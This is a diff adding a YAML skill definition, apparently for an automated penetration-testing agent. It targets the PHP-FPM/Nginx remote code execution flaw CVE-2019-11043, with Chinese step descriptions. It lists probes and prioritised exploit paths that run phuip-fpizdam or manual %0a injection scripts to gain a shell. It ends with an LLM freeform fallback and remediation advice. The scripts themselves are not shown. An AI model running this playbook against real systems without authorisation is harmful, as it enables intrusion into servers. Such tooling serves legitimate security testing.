@@ -1,0 +1,135 @@
+skill_id: php_fpm_rce
+name: "PHP-FPM Nginx 缓冲区溢出 RCE (CVE-2019-11043)"
+category: web_rce
+phase: foothold
+version: "3.0"
+
+match:
+  rules:
+    - cve_matches: ["CVE-2019-11043"]
+    - fingerprint_contains: ["php-fpm"]
+    - fingerprint_contains: ["PHP-FPM"]
+    - evidence_contains: ["php-fpm", "CVE-2019-11043"]
+    - evidence_contains: ["cve-direct-check"]
+
+probes:
+  - id: check_0a_anomaly
+    description: "检测 /index.php/%0a 路径注入异常（CVE-2019-11043 本质特征）"
+    command: "bash {skill_dir}/scripts/check_0a_anomaly.sh {ENDPOINT}"
+    timeout: 30
+    parse_rules:
+      - if_contains: ["FPM_VULNERABLE_CONFIRMED"]
+        set: { fpm_vulnerable: true }
+      - if_contains: ["FPM_VULNERABLE_LIKELY"]
+        set: { fpm_likely: true }
+
+  - id: check_phuip
+    description: "检查 phuip-fpizdam 工具"
+    command: "bash {skill_dir}/scripts/check_phuip.sh"
+    timeout: 5
+    parse_rules:
+      - if_contains: ["PHUIP_AVAILABLE"]
+        set: { phuip_available: true }
+      - if_contains: ["PHUIP_MISSING"]
+        set: { phuip_available: false }
+
+exploit_paths:
+  # Path A: phuip-fpizdam auto exploit (confirmed vulnerable + tool available)
+  - path_id: phuip_confirmed
+    name: "phuip-fpizdam 自动利用"
+    priority: 1
+    conditions:
+      fpm_vulnerable: true
+      phuip_available: true
+    steps:
+      - id: run_fpizdam
+        description: "运行 phuip-fpizdam 注入 PHP_VALUE"
+        command: "bash {skill_dir}/scripts/run_fpizdam.sh {ENDPOINT}"
+        timeout: 120
+        success_criteria:
+          stdout_contains_any: ["FPIZDAM_SUCCESS", "Success", "Was able to execute"]
+        on_success: verify_rce
+        on_fail: fpizdam_retry
+
+      - id: fpizdam_retry
+        description: "phuip-fpizdam 重试（有时需要多次）"
+        command: "bash {skill_dir}/scripts/fpizdam_retry.sh {ENDPOINT}"
+        timeout: 300
+        success_criteria:
+          stdout_contains_any: ["FPIZDAM_SUCCESS", "Success", "Was able to execute"]
+        on_success: verify_rce
+        on_fail: next_path
+
+      - id: verify_rce
+        description: "多次 POST 命中被污染的 worker 验证 RCE"
+        command: "bash {skill_dir}/scripts/verify_rce.sh {ENDPOINT}"
+        timeout: 120
+        success_criteria:
+          stdout_regex: "(uid=\\d+\\(\\w+\\)|PHP_FPM_RCE_OK)"
+        on_success: conclude_success
+        on_fail: conclude_fail
+        evidence_capture:
+          shell_type: "rce_php_fpm"
+          current_user: stdout
+
+  # Path B: explore mode for likely-vulnerable targets
+  - path_id: phuip_likely
+    name: "phuip-fpizdam 探索（疑似漏洞）"
+    priority: 2
+    conditions:
+      fpm_likely: true
+      phuip_available: true
+    skip_if:
+      fpm_vulnerable: true
+    steps:
+      - id: explore_fpizdam
+        description: "用 phuip-fpizdam 探测"
+        command: "bash {skill_dir}/scripts/explore_fpizdam.sh {ENDPOINT}"
+        timeout: 120
+        success_criteria:
+          stdout_contains_any: ["FPIZDAM_SUCCESS", "Success", "Was able to execute"]
+        on_success: explore_verify
+        on_fail: next_path
+
+      - id: explore_verify
+        description: "验证 RCE"
+        command: "bash {skill_dir}/scripts/explore_verify.sh {ENDPOINT}"
+        timeout: 90
+        success_criteria:
+          stdout_regex: "(uid=\\d+\\(\\w+\\)|PHP_FPM_RCE_OK)"
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "rce_php_fpm"
+
+  # Path C: manual exploit without phuip-fpizdam
+  - path_id: manual_exploit
+    name: "手动 curl 暴力注入"
+    priority: 3
+    conditions:
+      fpm_vulnerable: true
+    skip_if:
+      phuip_available: true
+    steps:
+      - id: manual_inject
+        description: "手动发送大量 %0a 请求尝试注入 PHP_VALUE"
+        command: "bash {skill_dir}/scripts/manual_inject.sh {ENDPOINT}"
+        timeout: 120
+        success_criteria:
+          stdout_regex: "(uid=\\d+\\(\\w+\\)|MANUAL_RCE_OK)"
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "rce_php_fpm_manual"
+
+  # Path D: LLM freeform fallback
+  - path_id: llm_freeform
+    name: "LLM 推理（限定 PHP-FPM 范围）"
+    priority: 99
+    mode: react_freeform
+    max_rounds: 5
+
+remediation: |
+  1. 升级 PHP 至 7.1.33 / 7.2.24 / 7.3.11 或更高版本
+  2. 修改 Nginx 配置，移除 fastcgi_split_path_info
+  3. 添加 try_files $uri =404
